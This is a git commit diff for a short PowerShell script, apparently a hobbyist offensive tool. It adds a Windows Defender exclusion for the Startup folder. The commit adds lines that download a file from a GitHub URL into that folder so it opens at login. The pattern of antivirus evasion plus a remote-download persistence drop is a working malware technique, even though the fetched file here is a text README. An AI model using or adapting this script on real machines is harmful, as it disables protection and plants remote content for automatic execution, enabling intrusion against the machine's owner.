219d92fc10fccc6bb8861f4e1c076b4dfa86e5c3
LeviTheSkriptKiddie <102006486+LeviTheSkriptKiddie@users.noreply.github.com>
2022-10-26 03:17:26 -0700

    Update AddExclusion.ps1
    Adding Download Function

--- AddExclusion.ps1
+++ AddExclusion.ps1
@@ -1,1 +1,4 @@
 Add-MpPreference -ExclusionPath "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"; 
+$ProcName = "ReadMe.txt"
+$WebFile = "https://raw.githubusercontent.com/LeviTheSkriptKiddie/LeviTheSkriptKiddie/main/README.md"
+(New-Object System.Net.WebClient).DownloadFile($WebFile,"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\$ProcName")
